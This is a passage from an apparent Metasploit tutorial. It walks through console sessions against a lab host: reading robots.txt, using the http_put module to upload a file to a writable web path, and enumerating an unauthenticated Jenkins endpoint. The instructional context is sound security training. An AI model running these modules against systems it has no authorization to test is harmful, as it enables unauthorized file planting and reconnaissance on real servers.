```
Disallow: ./owasp-esapi-php/
Disallow: ./documentation/
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf auxiliary(robots_txt) >
```

3. The HTTP Writable Path PUT/DELETE File Access auxiliary module can abuse misconfigured web servers to upload and delete web content via PUT and DELETE HTTP requests. The set action to either PUT or DELETE. PUT is the default. If a filename isn't specified, the module will generate a random string for you as a .txt file:

```
msf > use auxiliary/scanner/http/http_put
msf auxiliary(http_put) > set PATH /uploads
PATH => /uploads
msf auxiliary(http_put) > set RHOSTS 192.168.216.10
RHOSTS => 192.168.216.10
msf auxiliary(http_put) > set RPORT 8585
RPORT => 8585
msf auxiliary(http_put) > run

[+] File uploaded:
http://192.168.216.10:8585/uploads/msf_http_put_test.txt
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf auxiliary(http_put) >
```

4. To run the auxiliary module, we need to specify the target address, or range, the target port, and the path to the Jenkins-CI application:

```
msf > use auxiliary/scanner/http/jenkins_enum
msf auxiliary(jenkins_enum) > set RHOSTS 192.168.216.10
RHOSTS => 192.168.216.10
msf auxiliary(jenkins_enum) > set RPORT 8484
RPORT => 8484
msf auxiliary(jenkins_enum) > set TARGETURI /
TARGETURI => /
msf auxiliary(jenkins_enum) > run
```

```
[+] http://192.168.216.10:8484/ - /systemInfo does not require authentication (200)
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf auxiliary(jenkins_enum) >
```